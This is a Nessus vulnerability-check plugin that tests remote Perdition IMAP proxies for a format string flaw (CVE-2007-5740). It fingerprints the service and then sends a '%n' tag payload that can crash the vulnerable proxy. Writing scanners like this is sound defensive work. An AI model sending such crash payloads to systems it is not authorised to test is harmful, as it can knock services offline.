#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(27598);
  script_version("$Revision: 1.10 $");

  script_cve_id("CVE-2007-5740");
  script_bugtraq_id(26270);
  script_osvdb_id(42004);

  script_name(english:"Perdition IMAPD IMAP Tag Remote Format String Arbitrary Code Execution");
  script_summary(english:"Sends a bogus IMAP tag");

 script_set_attribute(attribute:"synopsis", value:
"The remote IMAP server is affected by a format string vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote IMAP service is actually a Perdition IMAP proxy. 

The version of Perdition installed on the remote host appears to be
affected by a format string vulnerability in which it copies the IMAP
tag into a character buffer without first validating it and then
passes it to 'vsnprintf()' as a format string.  An unauthenticated
remote attacker may be able to leverage this issue to execute
arbitrary code on the remote host subject to the permissions under
which the proxy runs, by default 'nobody'. 

Note that exploiting this to actually execute code may be difficult
due to OS and compiler security features." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/483034" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Perdition version 1.17.1 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"exploit_framework_core", value:"true");
 script_cwe_id(134);
 script_set_attribute(attribute:"plugin_publication_date", value: "2007/11/01");
 script_cvs_date("$Date: 2011/03/11 21:52:37 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
  script_category(ACT_ATTACK);
  script_family(english:"Gain a shell remotely");

  script_copyright(english:"This script is Copyright (C) 2007-2011 Tenable Network Security, Inc.");

  script_dependencies("find_service2.nasl");
  script_require_ports("Services/imap", 143);

  exit(0);
}


port = get_kb_item("Services/imap");
if (!port) port = 143;
if (!get_port_state(port)) exit(0);


# Establish a connection and read the banner.
soc = open_sock_tcp(port);
if (!soc) exit(0);

s = recv_line(socket:soc, length:1024);
if (!strlen(s))
{
  close(soc);
  exit(0);
}


# Send an invalid command to make sure it's Perdition.
c = SCRIPT_NAME;
send(socket:soc, data:string(c, "\r\n"));
s = recv_line(socket:soc, length:1024);
if (!strlen(s))
{
  close(soc);
  exit(0);
}

s = chomp(s);
if (string(c, " BAD Missing command, mate") == s)
{
  # Check for the vulnerability.
  c = raw_string("abc%n", 0x00);
  send(socket:soc, data:string(c, "\r\n"));
  s = recv_line(socket:soc, length:1024);
  if (!strlen(s))
  {
    security_hole(port);
    exit(0);
  }
}


# Logout.
send(socket:soc, data: 'a1 LOGOUT\r\n');
s = recv_line(socket:soc, length:1024);
close(soc);
